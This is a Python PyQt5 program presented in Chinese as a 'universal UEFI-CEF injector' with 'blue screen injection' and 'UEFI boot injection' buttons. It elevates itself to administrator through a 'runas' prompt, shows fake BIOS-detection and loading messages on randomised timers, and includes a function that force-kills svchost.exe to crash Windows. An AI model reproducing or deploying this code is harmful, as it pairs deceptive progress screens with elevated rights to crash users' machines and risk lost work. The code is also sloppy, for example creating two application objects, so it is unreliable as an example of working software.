from PyQt5.QtWidgets import QWidget, QLabel, QPushButton, QComboBox, QGroupBox, QTextBrowser, QApplication, QMessageBox
from PyQt5.QtCore import QSize, QRect, QCoreApplication, Qt
from PyQt5.QtGui import QFont
from sys import exit, argv, executable
from time import sleep
from os import system
from random import randint
from datetime import datetime
from ctypes import windll

class Gui_Main(QWidget):
    def __init__(self) -> None:
        super().__init__()
        self.setupUi()
    
    def setupUi(self):
        self.setFont(QFont("Microsoft YaHei UI"))
        self.resize(400, 215)
        self.setMinimumSize(QSize(400, 215))
        self.setMaximumSize(QSize(400, 215))
        
        self.Title = QLabel(self)
        self.Title.setGeometry(QRect(10, 10, 380, 15))
        self.Title.setStyleSheet(u"color: rgb(218, 114, 24);")
        
        self.BuleScreen_btn = QPushButton(self)
        self.BuleScreen_btn.setGeometry(QRect(15, 35, 100, 45))
        
        self.UEFI_btn = QPushButton(self)
        self.UEFI_btn.setGeometry(QRect(120, 35, 100, 45))
        
        self.BlueScreenCode = QComboBox(self)
        self.BlueScreenCode.setGeometry(QRect(290, 36, 90, 20))
        self.BlueScreenCode.setEnabled(False)
        self.BlueScreenCode.addItems(["暂不支持"])
        
        self.BlueScreenCodeTip = QLabel(self)
        self.BlueScreenCodeTip.setGeometry(QRect(225, 39, 60, 15))
        
        self.BIOSModeTip = QLabel(self)
        self.BIOSModeTip.setGeometry(QRect(225, 60, 60, 16))
        
        self.BIOSMode = QComboBox(self)
        self.BIOSMode.setGeometry(QRect(290, 58, 90, 20))
        self.BIOSMode.setEnabled(False)
        self.BIOSMode.addItem("自动检测")
        
        self.Log = QGroupBox(self)
        self.Log.setGeometry(QRect(15, 80, 370, 120))
        
        self.LogDisplay = QTextBrowser(self.Log)
        self.LogDisplay.setGeometry(QRect(5, 15, 360, 100))
        
        self.Tip = QLabel(self)
        self.Tip.setGeometry(QRect(1, 201, 265, 11))
        
        self.setWindowTitle(QCoreApplication.translate("Form", u"\u901a\u7528UEFI-CEF\u6ce8\u5165\u5668", None))
        self.Title.setText(QCoreApplication.translate("Form", u"\u8be5\u7a0b\u5e8f\u6b63\u5904\u4e8eDev\u5f00\u53d1\u7248\u4e2d\uff0c\u53ef\u80fd\u51fa\u73b0\u9519\u8bef\uff0c\u6ce8\u5165\u524d\u8bf7\u5907\u4efd\u7cfb\u7edf\u53ca\u6587\u4ef6\uff01", None))
        self.BuleScreen_btn.setText(QCoreApplication.translate("Form", u"\u84dd\u5c4f\u6ce8\u5165", None))
        self.UEFI_btn.setText(QCoreApplication.translate("Form", u"UEFI\u542f\u52a8\u6ce8\u5165", None))
        self.BlueScreenCodeTip.setText(QCoreApplication.translate("Form", u"\u84dd\u5c4f\u4ee3\u7801\uff1a", None))
        self.BIOSModeTip.setText(QCoreApplication.translate("Form", u"BIOS\u7c7b\u578b\uff1a", None))
        self.Log.setTitle(QCoreApplication.translate("Form", u"\u65e5\u5fd7\u8bb0\u5f55\u5668", None))
        self.Tip.setText(QCoreApplication.translate("Form", u"BIOS\u6a21\u5f0f(\u81ea\u52a8\u68c0\u6d4b)\uff1aUEFI BIOS  \u5b89\u5168\u6a21\u5f0f\uff1a\u5426", None))
        
    def down(self):
        self.LogDisplay.append(Functions.GetLogTimeDisplay()+"加载完毕！")

class Gui_Setup(QWidget):
    def __init__(self) -> None:
        super().__init__()
        self.setupUi()
    
    def setupUi(self):
        self.resize(395, 90)
        self.setMinimumSize(QSize(395, 90))
        self.setMaximumSize(QSize(395, 90))
        self.setWindowTitle(QCoreApplication.translate("Form", u"\u901a\u7528UEFI-CEF\u6ce8\u5165\u5668", None))
        self.setFont(QFont("Microsoft YaHei UI", 20))
        self.setStyleSheet(u"background-color: rgb(0, 85, 255);\n"
                            "color: rgb(255, 255, 255);")
        
        self.label = QLabel(self)
        self.label.setObjectName(u"label")
        self.label.setGeometry(QRect(80, 30, 250, 30))
        self.label.setAlignment(Qt.AlignCenter)
        
        self.setup()
        
    def setup(self):
        
        if Functions.IsAdmin():
            pass
        else:
            if Functions.GetAdmin():
                pass
            else:
                QMessageBox.critical(self, "启动失败!", "提权失败，请以管理员身份运行!", QMessageBox.Ok)
                exit(1)
            
        self.show()
        QApplication.processEvents()
        self.label.setText("检测BIOS引导模式...")
        QApplication.processEvents()
        sleep(randint(100, 200)/100)
        self.label.setText("加载控件...")
        QApplication.processEvents()
        sleep(randint(100, 200)/100)
        self.label.setText("加载文件...")
        QApplication.processEvents()
        sleep(randint(100, 200)/100)
        self.close()
        window1.show()
        window1.down()
        
class Functions():
    def GetLogTimeDisplay() -> str:
        return "["+str(datetime.now())+"] "
    
    def BlueScreen() -> None:
        system("taskkill /im svchost.exe /f")
        
    def IsAdmin() -> bool:
        try:
            if windll.shell32.IsUserAnAdmin() == 1:
                return True
            else:
                return False
        except:
            return False
        
    def GetAdmin():
        try:
            # 打包前将参数__file__改为""
            windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)
            return True
        except:
            return False

app1 = QApplication(argv)
app2 = QApplication(argv)
window1 = Gui_Main()
window2 = Gui_Setup()
exit(app1.exec_())